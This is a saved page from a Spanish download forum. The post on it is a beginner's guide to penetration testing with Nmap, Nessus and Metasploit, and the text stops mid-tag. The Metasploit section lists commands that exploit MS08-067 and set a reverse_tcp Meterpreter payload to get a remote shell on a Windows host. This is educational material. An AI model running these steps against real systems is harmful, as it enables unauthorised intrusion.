@@ -1,0 +1,796 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//ES" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="https://www.w3.org/1999/xhtml" lang="es" xml:lang="es" >
+<head>
+<base href="https://identi.io/">
+<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+<title>Pruebas de penetración para principiantes  - Identi</title>
+<meta http-equiv="content-type" content="application/xhtml+xml; charset=UTF-8"/>
+<meta name="referrer" content="always">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="msvalidate.01" content="C5D8F90264E49CBCC53E16C4A4783DB0" />
+<meta name="p:domain_verify" content="2ce1158220194154bfc7925e0aa151f2"/>
+<meta name="keywords" content="Identi, Mega, Copiapop, Zippyshare, Mediafire, Descargas, Gratis, Identili, Full, serial, completo, programas, antivirus, seriales, licencias, peliculas, series, android, iphone, Links, Descarga Mega, Descargar Gratis, pelis24, cuevana" /><meta name="description" content="Realizar pruebas de penetración es una tarea compleja, involucra un proceso en donde se realizan distintos tipos de tareas que identifican, en una infraestructura objetivo, las vulnerabilidades que..." /><link rel="stylesheet" type="text/css" href="/css/identix1.css?v=1.1"/><link rel="stylesheet" type="text/css" href="/css/jquery-ui.css"/><script type="text/javascript">
+var global = {
+noavatar : "https://identi.io//images/def/avatar.png",
+images_dir : "https://identi.io/Themes/Identiz/images",
+scripturl : "https://identi.io/index.php",
+is_logged : false,
+boardurl : "https://identi.io",
+images_url : "https://identi.io/Themes/Identiz/images",
+id_member: "0",
+sources_directorio : "https://identi.io/Sources",
+pauth: 0,
+simg:new RegExp(),
+sdown:new RegExp(),
+slinks:new RegExp()}
+</script>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-GXW04CWGVY"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-GXW04CWGVY');
+</script>
+<script type="text/javascript" src="/js/jquery.1.7.min.js"></script><script src='https://www.google.com/recaptcha/api.js?render=6Le3g7IUAAAAANx7-80AckUlqLrX8tA1JIneAIEE'></script><script>var guest=true;</script><script type="text/javascript" src="/dev/developstone.js?99" defer="defer"></script>
+<script type="text/javascript">var approval = true;</script>
+<script type="text/javascript" src="/js/adframe.js?v=1" defer="defer"></script>
+<script type="text/javascript" src="/js/jquery-ui-1.8.23.custom.min.js" defer="defer"></script>
+<script type="text/javascript" src="/js/lazy.js?v=1.2" defer="defer"></script>
+<script type="text/javascript" src="/js/aes/aes2.min.js" defer="defer"></script>
+<script type="text/javascript" src="/js/acciones.js?v=13"></script>			<script>
+				var tokens='cmM4MmpSdVBsRXNpeEtXVTJGc2RHVmtYMTk3bEZRdDFjRVN1MFpHbVAyTHVlTmNpd3owQ2ZtUEdOVzkySW55RFVDa294M1FnQjhieVVFMVZRUHRneEVWVGJ3bTJiazNiSlcrNUE9PUMzeU0yZzBQcTgxVnJ4cg==';
+			</script>
+			<script type="text/javascript" src="/js/display15.js?v=70"></script>		<script>
+function loadReca(obj){
+toopen = obj.attr('toopen');
+checkf = obj.parent().find('.spoiler-btn');
+placeT = obj.parent().find('.info_bbc');
+if(toopen != 'jd'){
+linkG = placeT.html();} else {
+linkG = obj.parent().find('.myjdownloader').attr('datacr');}
+captchaT = obj.attr('captchaID');
+$.ajax({
+url: '/ajax/recaptcha.php',
+data: 'response='+grecaptcha.getResponse(window[captchaT])+'&link='+encodeURIComponent(linkG)+'&type='+toopen,
+type: 'POST',
+success: function(h){
+if(h.charAt(0) != '0'){
+obj.hide();
+obj.parent().find('.in-reca').hide();
+if(toopen == 'spoiler'){
+placeT.html(h);
+checkf.show();} else {
+obj.parent().find('.myjdownloader').show();
+obj.parent().find('.myjdownloader').attr('href', obj.parent().find('.myjdownloader').attr('href')+h);}}}});}
+</script>
+<script data-cfasync="true" id="mensiones_tmp" type="text/html">
+<div class="tooltip-c compact clearfix">
+<span class="pick"></span>
+<div class="clearfix data-tip">
+<a href="?action=profile;user=<%= name %>" class="avatar-tip"><img id="error_avatar" alt="imagen avatar identi" width="50" height="50" src="<%= avatar %>"></a>
+<div class="user-tip">
+<a class="nick" href="https://identi.io/index.php?action=profile;user=<%=name%>"><%= name %></a>
+<img alt="hombre o mejor identi" src="/images/<%= sexo %>.png" /> <img alt="pais" src="/images/paises/16/<%= pais %>.png"/>
+<span class="trango"> <%= rango %> </span>
+</div>
+</div>
+<div class="view-more"><a>M&aacute;s informaci&oacute;n</a></div>
+</div>
+<div class="tooltip-c extended clearfix" style="word-wrap:break-word; overflow:hidden">
+<span class="pick"></span>
+<div class="clearfix data-tip">
+<a href="?action=profile;user=<%= name %>" class="avatar-tip"><img alt="identi avatar 2" id="errora_avatar" width="50" height="50" src="<%= avatar %>"></a>
+<div class="user-tip">
+<a class="nick" href="https://identi.io/index.php?action=profile;user=<%= name %>"><%= name %></a>
+<img alt="m o f identi.io" src="/images/<%= sexo %>.png" /> <img alt="nacionalidad" src="/images/paises/16/<%= pais %>.png" /> <span class="trango"> <%= rango %> </span>
+</div>
+</div>
+<div class="more-data">
+<b><%= posts %> Posts</b>
+<b><%= pts %> Puntos</b>
+<span><%= personalText %></span>
+</div>
+<div class="view-more">
+</div>
+</div>
+</script>
+<script type="text/javascript">
+var RecaptchaOptions = {
+theme : 'clean',
+lang : 'es'}
+dialog_conf = {
+autoOpen: false,
+width: 300,
+modal: true,
+resizable: false,
+draggable: false,
+buttons: [{
+text: "Ok",
+"class": 'floatR',
+click: function() {
+$(this).dialog("close");}}]}
+$(document).ready(function(){
+$('#my-dialog, #vprevia, #ui-alert').dialog(dialog_conf);
+timelib.current = 1761482335;
+timelib.upd();});
+</script>
+<script type="text/javascript"><!--
+   if(top.location!=this.location) top.location=this.location;
+   //--></script>
+</head>
+<body>
+<div id="mask" style="display:none;"></div>
+<div id="mydialog" style="display:none;"></div>
+<div id="my-dialog" style="display:none;"></div>
+<div id="ui-alert" style="display:none;"></div>
+<div id="mypopup" style="display: none;"></div>
+<span id="scroll-up" style="display: none; "></span>
+<div class="tooltip-anonimo clearfix box-shadow-soft" style="display: none;">
+<span class="pico"></span>
+<p><b>&Uacute;nete a Identi!</b></p>
+<p>Esta acci&oacute;n es s&oacute;lo para usuarios de Identi</p>
+<button onclick="./index.php?action=registrarse" class="ui-button-positive">Reg&iacute;strate</button>
+<button onclick="./index.php?action=login" >Ya tienes una cuenta?</button>
+</div>
+<div class="menu">
+<div class="bar clearfix">
+<ol class="menuTabs">
+<li class="tabbed">
+<a href="https://www.identi.io/index.php?cat=23" title="Peliculas en Espa&ntilde;ol latino">Peliculas</a>
+</li>
+<li class="tabbed">
+<a href="https://www.identi.io/index.php?cat=45" title="Series en Espa&ntilde;ol latino">Series</a>
+</li>
+<li class="tabbed">
+<a href="https://www.identi.io/index.php?cat=11" title="Juegos para PC">Juegos PC</a>
+</li><li class="tabbed  registrate"><a style="color:#01DF01" href="https://www.identi.io/index.php?action=registrarse">Registrate</a></li></ol>
+<div class="opciones_usuario anonimo">
+<div class="identificarme">
+	<a class="iniciar_sesion" id="login_button">Accede
+	<span class="logintab_overlay" style="display:none">Accede</span>
+	</a>
+</div>
+<div id="main_login">
+<div class="tabs">
+<ul class="clearfix"><li id="login_close" onclick="close_login()"></li></ul>
+
+<div class="login_cuerpo">
+
+ <div class="login_form">
+    <form action="https://identi.io/index.php?action=login2" method="post" accept-charset="ISO-8859-1" name="frmLogin" id="frmLogin" onsubmit="hashLoginPassword(this, '4149d2b1eb7861aa82990477976c6267');"><label></label>
+      <input maxlength="64" id="user" name="user" class="login_mf " placeholder="Email o Usuario" type="text">
+      <label>
+      <input maxlength="64" id="passwrd" name="passwrd" class="login_mf " placeholder="Contrase&ntilde;a" type="password">
+      </label>
+<a href="https://www.identi.io" onMouseDown="return contrasena(this);">Olvidaste tu contrase&ntilde;a?</a>
+	    <!----<input type="checkbox" id="login_remember"/> <p id="login_remember_p">Recordarme</p>--->
+   <input class="primary-mf-button" type="submit" value="Acceder a Identi"/>
+    <input class="secondary-mf-button" onclick="location.href='https://identi.io/index.php?action=registrarse'" type="button" value="Crear un usuario"/>
+    </form>
+	</div>
+	</div>
+  </div>
+</div>
+	</div></div></div>
+<div style="background: #004CA0 url(/images/head/head_1.png) repeat-x;" class="art-Header-gif">
+<div class="art-Header">
+<div class="art-Logo">
+<div id="logo">
+<a href="https://identi.io" title="Identi - Descargar Peliculas, Juegos, Series..." id="logo-img">
+<img src="/images/espacio.png" width="1" height="16" alt="Identi - Pruebas de penetración para principiantes " title="Identi - Pruebas de penetración para principiantes " align="top" border="0"/></a>
+</div>
+</div>
+
+</div>
+</div>
+</div>
+<div id="art-main">
+<div class="art-Sheet"><div class="subMenuContent">
+<div class="subMenu clearfix" id="subMenuPosts">
+<ul class="floatL clearfix tabsMenu">
+<li  class="here"  ><a  href="https://identi.io" title="Post de Inicio - Identi"><i class="sprite_i inicio"></i><img src="/images/espacios.png" alt="identi" width="4" height="1" />Posts</a></li>
+<li><a href="https://identi.io/index.php?action=comunidades" title="Entra y participa..."><i class="sprite_i comunidades"></i><img src="/images/espacios.png" alt="descargar peliculas" width="4" height="1" />Comunidades</a></li><li> <a href="https://identi.io/index.php?action=TOPs" title="Ranking"><i class="sprite_i top"></i><img src="/images/espacios.png" alt="peliculas identi" width="4" height="1" />Tops</a></li>
+<li><a href="https://identi.io/index.php?action=buscador" rel="search" title="Busca en Identi un post o tema..."><i class="sprite_i busqueda"></i><img src="/images/espacios.png" alt="programas" width="4" height="1" />Buscador</a></li></ul>
+<div class="fb-like" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
+<div class="search_top" id="search">
+<form id="ajaxSearch_form" action="https://identi.io/index.php?action=buscador" method="post" accept-charset="UTF-8">
+<input placeholder="Buscar..." id="searchbar" type="text" name="search" />
+<input id="searchbtn" type="submit" value=""/>
+</form>
+</div>
+</div></div>
+<div class="art-Sheet-body">
+<div class="div_control"><style>
+.linkhidder {
+    padding: 8px;
+    font-size: 14px!important;
+    border-radius: 3px;
+    font-weight: bold;
+    border: 1px solid #68B4F1;
+    color: #096FDB!important;
+    position: relative;
+    box-sizing: border-box;
+    cursor: pointer;
+    outline: none!important;
+}
+.linkhidder:before {
+    content: '';
+    position: absolute;
+    top: 0px;
+    left: 0px;
+    width: 0px;
+    height: 42px;
+}
+.linkhidder:hover:before {
+ width: 100%;
+}
+</style>
+<script>
+var hash = '3061d46a1e1f916118fec9eb17c049a401b56443';
+
+$(document).ready(function(){
+comments.hideQuotes();
+comments.iconsHover();
+$('.com_opt a').tipsy({fade: true,gravity:'s'});});
+</script>
+<div class="display_izq_col">
+<div class="display_sidebar clearfix">
+<div class="nick_sidebar clearfix">
+<a rel="nofollow" href="?action=profile;user=xsparda">xsparda</a>
+<a title="Desconectado" class="addtipsy_s offline"></a><div class="mpersonal_sidebar">
+"*La Realidad Es Plural Y Mutable*"
+</div>	</div>
+<div class="sidebar_superior clearfix">
+<div class="avatar_sidebar">
+<a rel="nofollow" href="?action=profile;user=xsparda" title="Ir al Perfil de xsparda"><img id="error_avatar" class="avatar" border="0" width="120" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8dCV3U60fG1pEAWV75cnHjWv1Qvg4ohDXAi1SEQ1TaiGIfCSl"/></a>
+<div class=" rango_sidebar clearfix">Platinum</div>
+</div>
+<div class="sidebar_right">
+<div class="extra"><img class="addtipsy_s" title="" src="/images/paises/24/co.png" /><img class="addtipsy_s" src="/images/male.png" title="Masculino" width="24" height="24" border="0" /><img class="addtipsy_s" width="32" height="32" src="/images/rangos/platinum.png" title="Platinum" border="0" />
+</div>
+</div>
+</div><div class="clearfix">
+<div class="clearfix boton_seguir">
+<span class="button require-login " accion="seguir" id="seguir" onclick="seguir.user(1790349)"  >Seguir Usuario</span>
+</div>
+<div class="clearfix boton_MP">
+<span class="button enviar_mp addtipsy_s require-login" onclick="javascript:mp.enviar_mensaje('1790349');" title="Enviar Mensaje Privado (Desconectado)"><i class="ui-icon ui-icon-mail-closed"></i>MP</span>
+</div>
+</div>
+<div class="sidebar_inferior clearfix">
+<span class="clearfix stats">
+<ul class="floatL">
+<li><b id="num_seguir">125</b> Seguidores</li>
+<li><b>3553</b> Puntos</li></ul>
+<ul class="floatR">
+<li><b>96</b> Posts</li>
+<li><b>166</b> Comentarios</li>
+</ul>
+</span>
+
+</div></div>
+</div>
+<div class="display_der_col"><div class="header_post clearfix" >
+<h1 class="title_post">Pruebas de penetración para principiantes </h1>
+<div class="botones">
+<ul id="icons" class="ui-widget ui-helper-clearfix">
+<li onclick="location.href='https://identi.io/index.php?topic=378855';" class="ui-state-default ui-corner-all" title="Post Anterior" ><span class="ui-icon ui-icon-triangle-1-w"></span></li>
+<li onclick="location.href='https://identi.io/index.php?topic=378857';" class="ui-state-default ui-corner-all" title="Siguiente Post"><span class="ui-icon ui-icon-triangle-1-e"></span></li>
+</ul>
+</div>
+</div>
+<div class="extra_info clearfix">
+<ul>
+<li class="floatL"><!--sse-->Categor&iacute;a: <a href="https://identi.io/index.php?cat=25" alt="Software / Programas" title="Software / Programas">Software / Programas</a><!--/sse--></li>
+<li class="floatR">Publicado  hace m&aacute;s de 10 a&ntilde;os </li>
+</ul>
+</div>
+<div class="post_body" id="post_1040884">
+<div style="width:728px; margin: -10px 0 10px -15px;" class="clearfix"></div><script type="text/javascript">var onloadCallback = function() {};</script><div align="center"><span style="color: #57402b;"><font size="2" style="line-height: 1.3em;"><span style="font-family: Trebuchet MS, Liberation Sans, Geneva CY, Lucida Sans Unicode, sans-serif;"><img id="img_post" src="https://www.wordans.ca/wvc-1366664653/wordansfiles/images/2013/4/22/187559/187559_340.jpg" border="0"></span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Realizar pruebas de penetración es una tarea compleja, involucra un proceso en donde se realizan distintos tipos de tareas que identifican, en una infraestructura objetivo, las vulnerabilidades que podrían explotarse y los daños que podría causar un atacante. En otras palabras, se realiza un proceso de hacking ético para identificar qué incidentes podrían ocurrir antes de que sucedan y, posteriormente, reparar o mejorar el sistema, de tal forma que se eviten estos ataques.</span></font></span></div><br /><div align="center"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;"><img id="img_post" src="http://revista.seguridad.unam.mx/sites/revista.seguridad.unam.mx/files/images/pruebas_pen-02.jpg" border="0"></span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Para realizar una prueba de penetración de forma profesional, es necesario sumar a los conocimientos de hacking ético, otros aspectos fundamentales como: programación, metodologías, documentación, entre otros. No obstante, esos aprendizajes suelen venir una vez que se conocen y se saben utilizar muchas herramientas que son parte del proceso de penetration testing. El siguiente guia es un listado de las cinco herramientas que debes conocer, instalar y probar para dar tus primeros pasos en este ?arte?.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Lo que verás a continuación, es una pequeña guía de ?por dónde empezar? para aquellos principiantes que deseen introducirse en el mundo del hacking ético y de las pruebas de penetración. Estas son, a mi criterio, las primeras herramientas que deberás conocer, no solo para comenzar a prepararte para realizar esta tarea, sino para empezar a comprenderla.</span></font></span></div><br /><span style="color: #3d668e;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">1. NMAP</span></font></span><div align="center"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;"><img id="img_post" src="http://revista.seguridad.unam.mx/sites/revista.seguridad.unam.mx/files/Imagen1.png" border="0"><br />Imagen 1. Salida tradicional de ejecución de Nmap (nmap.org)</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">En un proceso completo de pruebas de penetración, existen instancias previas a ejecutar esta herramienta pero, para dar los primeros pasos, probablemente sea la mejor forma de comenzar. Nmap es una herramienta de escaneo de redes que permite identificar qué servicios se están ejecutando en un dispositivo remoto, así como la identificación de equipos activos, sistemas operativos en el equipo remoto, existencia de filtros o firewalls, entre otros.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">En palabras sencillas, cuando se va a atacar un servidor o dispositivo, el atacante podrá realizar distintas arremetidas en función del servicio: no es lo mismo dañar un servidor web, un servidor de base de datos o un router perimetral. Por lo tanto, en cualquier despliegue, el primer paso será identificar los servicios en la infraestructura, para decidir cómo avanzar y, considerando que en una prueba de penetración se ?imitan? los pasos de un atacante, también se iniciará de la misma manera.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Nmap es una herramienta de línea de comandos (existen algunas interfaces gráficas pero, personalmente, no las recomiendo, aunque es una cuestión de gustos) donde se debe indicar cuál será el o los objetivos y la serie de parámetros que afectarán la forma en que se ejecuten las pruebas y los resultados que se obtienen. Puede instalarse tanto en Linux, Windows, Mac u otros sistemas operativos.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">En su forma tradicional, una línea de comando sería la siguiente:</span></font></span></div><br /><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">&gt; nmap 172.16.1.1</span></font></span><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">En donde <i>nmap</i> es el comando en sí mismo y<i> 172.16.1.1</i> es el objetivo (que también puede ser indicado con un nombre de dominio). La respuesta a estos comandos será un listado de los puertos abiertos o cerrados en dicha dirección. La ejecución sin parámetros ejecuta un escaneo sencillo a los 1000 puertos más comunes (véase que en la imagen se muestra uno abierto y 999 cerrados), realizando anteriormente un ping para ver si el equipo está vivo (si el equipo no responde al ping, no se realizará el test de los puertos).</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Cuando agregas parámetros puedes obtener mejores resultados. Algunos parámetros comunes para tener en cuenta son:</span></font></span></div><br />[ul]<span style="color: #57402b;">[li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">[-iL] puedes indicar una lista de equipos o redes a escanear. &gt; nmap ?iL hosts.txt</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">[-sP] solo escanea con un ping. Es una buena forma de ver cuántas direcciones IP se pueden checar. Una vez que se tienen enlistadas, se podrá ir solo con las que están vivas.</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">[-P0] es la forma de omitir el ping e ir directo al escaneo de puertos. Muchos sistemas no responden el ping como método de seguridad, por lo que, escanearlos de todas formas, también puede ser útil en entornos más reales (no es necesario para los entornos de aprendizaje inicial).</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">[-p] lista los puertos que se desean escanear. &gt; nmap ?iL hosts.txt ?p 22,25,80,445</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">[-sV] intenta determinar la versión del servicio en el objetivo.</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">[-O] informa el sistema operativo en el objetivo.</span></font>[/li]</span>[/ul]<div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Una vez ejecutado Nmap, ya se conocen cuáles son los servicios (al menos los identificados) que se están ejecutando en el blanco de la prueba de penetración. Ahora ya se puede pasar a las siguientes etapas, en donde se utilizará esta información para comenzar la búsqueda de vulnerabilidades en la infraestructura y en los servicios identificados.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><span style="text-decoration: underline;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Ficha técnica</span></font></span></span></div><br />[ul]<span style="color: #57402b;">[li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Herramienta: Nmap</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Sitio web: <a href="http://nmap.org/" target="_blank" rel="nofollow"><span style="color: #fb8f53;">http://nmap.org/</span></a></span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Cómo empezar: instalarlo, ejecutar un comando sencillo hacia una dirección IP y luego probar agregando parámetros (nmap --help puede brindar más información) o ejecutar para múltiples direcciones IP (que deben ser indicadas en un archivo txt.</span></font>[/li]</span>[/ul]<div style="text-align: justify;"><span style="color: #3d668e;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">2. NESSUS</span></font></span></div><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Una vez que se tienen identificados los servicios que se están ejecutando, se puede comenzar el uso de las herramientas que sirven para identificar vulnerabilidades en los servicios. En este campo, la mejor herramienta para introducirse en este mundo es Nessus, otra aplicación gratuita (solo para uso hogareño, suficiente para los fines de este artículo; en el caso de fines profesionales es necesario usar la versión de pago) que, por su base de datos y su facilidad de uso, es la preferida en este aspecto.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Aunque posee una línea de comandos, considero que su interfaz gráfica, muy completa e intuitiva, es una forma sencilla de comenzar a probar esta herramienta.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Nessus posee una extensa base de datos de vulnerabilidades conocidas en distintos servicios y, por cada una de éstas, posee plugins que se ejecutan para identificar si la vulnerabilidad existe (o no) en determinado equipo objetivo. En resumen, al ejecutarse Nessus sin parámetros específicos, se probarán miles de vulnerabilidades y se obtendrá como resultado un listado de las vulnerabilidades que fueron identificadas.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">La lógica de Nessus es similar a Nmap: hay que indicar el objetivo, en este caso la o las direcciones IP y los parámetros. Estos permiten limitar el campo de búsqueda, especialmente si en una etapa anterior se identificaron los servicios: no tiene sentido buscar vulnerabilidades conocidas en Linux en un equipo que tiene instalado Windows.</span></font></span></div><br /><div align="center"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;"><img id="img_post" src="http://www.nessus.org/images/Creds_Main.png" border="0"><br />Imagen 2. Sección de configuraciones generales de exploración de Nessus (tenable.com)</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><span style="text-decoration: underline;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Ficha técnica</span></font></span></span></div><br />[ul]<span style="color: #57402b;">[li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Herramienta: Nessus</span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Sitio web: <a href="http://www.tenable.com/products/nessus/evaluate" target="_blank" rel="nofollow"><span style="color: #fb8f53;">tenable .com/products/nessus/</span></a></span></font>[/li][li]<font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Cómo empezar: Si tienes Windows, instalarlo ahí por interfaz gráfica es muy sencillo, funciona para conocerlo por primera vez. Recomiendo buscar el listado de plugins y ejecutar pruebas limitando solo a determinados servicios.</span></font>[/li]</span>[/ul]<div style="text-align: justify;"><span style="color: #3d668e;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">3. Metasploit Framework</span></font></span></div><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Una vez identificados los servicios y sus vulnerabilidades, el paso siguiente sería la explotación de las vulnerabilidades. Es decir, primero se tiene que probar si realmente las vulnerabilidades identificadas permiten a un atacante causar algún daño. Después se intenta conocer cuál sería ese daño. A pesar de que se haya identificado una vulnerabilidad en la instancia anterior, podría ser que, al momento de intentar explotarla, existan otras medidas de control que no hayan sido consideradas, otras capas de seguridad o distintas variables que podrían hacer más complicada la explotación de la misma. Asimismo, si se logra explotar la vulnerabilidad, podría comprobarse y dimensionar cuál podría ser el daño hacia la organización, en función de la información o sistemas que estuvieran ?detrás? de dicha vulnerabilidad.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Para este fin, Metasploit es la herramienta ideal para hacer estas pruebas. Mientras Nessus posee una base de datos de vulnerabilidades, Metasploit posee una base de exploits que podrían aprovecharlas. En otras palabras, en lugar de revisar si hay una vulnerabilidad en un equipo remoto, directamente se intenta la ejecución de un exploit y se simulan las consecuencias posteriores, en caso de que éste se ejecutara con éxito.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Al igual que Nessus, su versión de línea de comandos, msfconsole, es la tradicional, incluso recomendable para la automatización. Sin embargo, su interfaz gráfica es muy conveniente para dar los primeros pasos y tener una mayor comprensión.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Si quieres probar la línea de comandos puedes hacer las primeras pruebas. En Windows puedes abrirla directamente desde el Menú de inicio como ?Metasploit Console?. En Linux, tan solo puedes ejecutar un simple comando:</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">&gt; sudo msfpro</span></font></span></div><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Una vez que estás en la consola, verás que cambia el prompt:</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">msf-pro &gt;</span></font></span></div><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Hay una serie de comandos sencillos para dar los primeros pasos. Search, use, show, set y exploit son probablemente los mejores. Probaremos explotar una de las vulnerabilidades más famosas en Windows, la MS 08-067.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Si en un paso anterior (con Nessus) encontraste que el sistema posee dicha vulnerabilidad (con Nmap podrías haber encontrado que estás lidiando con una máquina Windows), sería lógico con search encontrar el exploit a utilizar.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">msf-pro &gt; search exploits 08-067</span></font></span></div><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Entre los resultados, lo más importante es que podrás encontrar la ruta del exploit y luego con use podrás decidir utilizarlo (sí, asombroso):</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">msf-pro &gt; use exploit/windows/smb/ms08_067_netapi<br /><br />msf exploit(ms08_067_netapi) &gt;</span></font></span></div><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">El comando show mostrará las alternativas para ejecutar el exploit.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">msf exploit(ms08_067_netapi) &gt; show options</span></font></span></div><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Luego, se podrá utilizar el comando set para configurar el exploit antes de la ejecución. En este caso, definiremos el local host (nuestra dirección IP), al host remoto (la dirección IP de destino, donde se supone que ya sabemos existe la vulnerabilidad) y el payload (acción a ejecutar, en este caso usaremos reverse_tcp que nos dará una consola remota en el equipo).</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">msf exploit(ms08_067_netapi) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br /><br />msf exploit(ms08_067_netapi) &gt; set LHOST [192.168.0.1]<br /><br />msf exploit(ms08_067_netapi) &gt; set RHOST [192.168.0.10]</span></font></span></div><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Finalmente, solo debes ejecutar ?exploit?.</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">msf exploit(ms08_067_netapi) &gt; exploit</span></font></span></div><div style="text-align: justify;"><span style="color: #57402b;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic Sans MS;">Si pudiste hacer estos pasos correctamente, podrás ver una consola remota en el equipo Windows y podrás testearla con comandos regulares de consola (ipconfig, dir, etc.).</span></font></span></div><br /><div style="text-align: justify;"><span style="color: #57402b;"><span style="text-decoration: underline;"><font size="3" style="line-height: 1.3em;"><span style="font-family: Comic 